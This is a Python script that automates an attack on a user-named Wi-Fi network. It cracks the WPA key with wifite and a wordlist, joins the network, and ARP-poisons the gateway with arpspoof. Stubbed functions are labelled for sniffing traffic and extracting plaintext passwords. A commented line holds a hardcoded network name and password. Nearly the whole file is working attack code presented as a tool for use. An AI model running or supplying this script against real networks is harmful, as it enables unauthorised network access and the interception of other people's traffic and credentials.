import os
import subprocess
import sys

INTERFACE_NAME = "wlan0"
WIFITE_PASSWORDS_FILE = "cracked.txt"
DICT_FILE = "dict.txt"

def setup():
    os.system("rm *.cap")
    os.system("rm {}".format(WIFITE_PASSWORDS_FILE))

def crackWPA(essid, dictFile):
    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--wpa", "--dict", dictFile]).wait()
    with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
        for line in passwords.readlines():
            if '"key":' in line:
                print("Password for network {} is {}\n\n".format(essid,line.split()[-1][1:-2]))
                return line.split()[-1][1:-2]

def connectToNetwork(essid, password):
    print("connecting to network")
    os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
    os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
    os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
    #os.system("sudo nmcli d wifi connect Vic password praetorian")
    #subprocess.Popen(["sudo", "nmcli", "d", "wifi", "connect", essid, "password", password]).wait()

def getGatewayIP():
    with subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE) as proc:
        out, _ = proc.communicate()
        for line in out.decode().split('\n'):
            if line.split()[0] == "default":
                return line.split()[2]
        raise Exception("Gateway IP not found.")

def sniffTraffic():
    # Log traffic to a file (i.e. dsniff -w dumpfile.pcap)
    pass

def parsePasswords():
    # Parse log file for plaintext passwords
    pass

def arpPoison(interface_name, host):
    arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return arpSpoofProc

if __name__ == "__main__":
    setup()
    essid = input("Enter the name of the network you'd like to attack:")
    password = crackWPA(essid, DICT_FILE)
    connectToNetwork(essid, password)
    input("Please connect to the network using the password. You can connect in your network settings or run this command in another terminal:\n nmcli d wifi connect \"{}\" password {}\nPress enter once you are connected.".format(essid, password))
    gatewayIP = getGatewayIP()
    arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
    sniffTraffic()
    parsePasswords()
    arpSpoofProc.terminate()